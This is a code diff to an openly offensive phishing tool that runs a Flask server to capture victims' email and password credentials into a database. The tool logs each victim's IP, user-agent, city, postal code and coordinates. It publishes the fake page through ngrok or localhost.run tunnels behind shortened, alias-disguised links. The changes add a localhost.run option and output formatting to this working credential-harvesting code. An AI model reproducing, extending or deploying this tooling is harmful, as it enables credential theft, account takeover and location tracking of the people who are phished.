@@ -1,6 +1,7 @@
 try:
     # importing Flask and other modules
     from flask import Flask, request, render_template, redirect
+    import time
     from waitress import serve
     import os, socket, os.path, argparse, requests
     from banner import *
@@ -63,13 +64,13 @@ try:
                 )
                 f.close()
             print(
-                f" [ * ] Victim {len(victim_list)} account id:",
+                f"\r [ * ] Victim {len(victim_list)} account id:",
                 email,
                 "password:",
                 password,
             )
-            print(" [ + ] saved in captured.db")
-            print("\n [ * ] Waiting for other victim to open the link...")
+            print("\r [ + ] saved in captured.db")
+            print("\r\n [ * ] Waiting for other victim to open the link...")
             return redirect(site)
 
         return render_template("index.html")
@@ -79,40 +80,40 @@ try:
         if request.method == "POST":
             victim_data = request.json
             if victim_data["status"] == "fail":
-                print(" [ - ] An error occurred when retrieving victim data :-(")
+                print("\r [ - ] An error occurred when retrieving victim data :-(")
             else:
                 victim_list.append(victim_data["ip"])
-                print("\n [ * ] An victim found !")
-                print(f" [ + ] Victim {len(victim_list)} IP: " + victim_data["ip"])
+                print("\r\n [ * ] An victim found !")
+                print(f"\r [ + ] Victim {len(victim_list)} IP: " + victim_data["ip"])
                 print(
-                    f" [ + ] Victim {len(victim_list)} user-agent: "
+                    f"\r [ + ] Victim {len(victim_list)} user-agent: "
                     + victim_data["useragent"]
                 )
                 print(
-                    f" [ + ] Victim {len(victim_list)} continent: "
+                    f"\r [ + ] Victim {len(victim_list)} continent: "
                     + victim_data["continent_code"]
                 )
                 print(
-                    f" [ + ] Victim {len(victim_list)} country: "
+                    f"\r [ + ] Victim {len(victim_list)} country: "
                     + victim_data["country_name"]
                 )
                 print(
-                    f" [ + ] Victim {len(victim_list)} region: "
+                    f"\r [ + ] Victim {len(victim_list)} region: "
                     + victim_data["region"]
                 )
-                print(f" [ + ] Victim {len(victim_list)} city: " + victim_data["city"])
+                print(f"\r [ + ] Victim {len(victim_list)} city: " + victim_data["city"])
                 print(
-                    f" [ + ] Victim {len(victim_list)} zip code: "
+                    f"\r [ + ] Victim {len(victim_list)} zip code: "
                     + victim_data["postal"]
                 )
                 print(
-                    f" [ + ] Victim {len(victim_list)} latitude and longitude:",
+                    f"\r [ + ] Victim {len(victim_list)} latitude and longitude:",
                     victim_data["longitude"],
                     ",",
                     victim_data["latitude"],
                 )
-                print(f" [ + ] Victim {len(victim_list)} ISP: " + victim_data["org"])
-                print(f"\n [ * ] Waiting for credentials...")
+                print(f"\r [ + ] Victim {len(victim_list)} ISP: " + victim_data["org"])
+                print(f"\r\n [ * ] Waiting for credentials...")
         return render_template("index.html")
 
     def is_connected():
@@ -125,7 +126,7 @@ try:
             pass
         return False
 
-    def short(url, alias):
+    def short(url, alias, ex=""):
         try:
             reqUrl = "https://yb.gd/short"
 
@@ -142,7 +143,7 @@ try:
 
             r = response.text.split('":"')[1].replace('"', "").replace("}", "")
             print(
-                " [ * ] Phishing short link: "
+                f"{ex} [ * ] Phishing short link: "
                 + alias
                 + "@"
                 + r.replace("\n", "").replace("https://", "")
@@ -150,7 +151,7 @@ try:
         except:
             if is_connected():
                 print(
-                    " [ ! ] Short url error!!!\n [ ! ] Please make an issue on github (https://github.com/sky9262/phishEye)"
+                    "\r [ ! ] Short url error!!!\n [ ! ] Please make an issue on github (https://github.com/sky9262/phishEye)"
                 )
             else:
                 print("You don't have internet connection for short url!!!")
@@ -161,8 +162,8 @@ try:
         url = ngrok.connect(port, bind_tls=True).public_url
         print(" [ * ] Ngrok public address: ", url)
         short(url, site)
-        print("\n============================ Ready To Go ============================")
-        print("\n [ * ] Waiting victim to open the link...")
+        print("\r\n============================ Ready To Go ============================")
+        print("\r\n [ * ] Waiting victim to open the link...") 
 
     if __name__ == "__main__":
         parser = argparse.ArgumentParser()
@@ -180,10 +181,21 @@ try:
         app.debug = False
         print(" [ * ] Phishiing to:", site)
         print(
-            " [ * ] Local address:",
+            "\r [ * ] Local address:",
             "http://" + socket.gethostbyname(socket.gethostname()) + ":" + PORT,
         )
-        ngrok = start_ngrok(PORT)
+        if not (os.path.isfile("./localhost.run")):
+            ngrok = start_ngrok(PORT)
+        else:
+            time.sleep(1)
+            url = ""
+            with open("./localhost.run","r") as f: 
+                _url = f.read().split("\n")[-2]
+                url = _url.split(",")[1].replace("\n","")
+            print("\r [ * ] Localhost.run public address:", url)
+            short(url, site, ex="\r")
+            print("\r\n============================ Ready To Go ============================")
+            print("\r\n [ * ] Waiting victim to open the link...")    
         serve(app, host="0.0.0.0", port=PORT, _quiet=True)
 
 except KeyboardInterrupt:
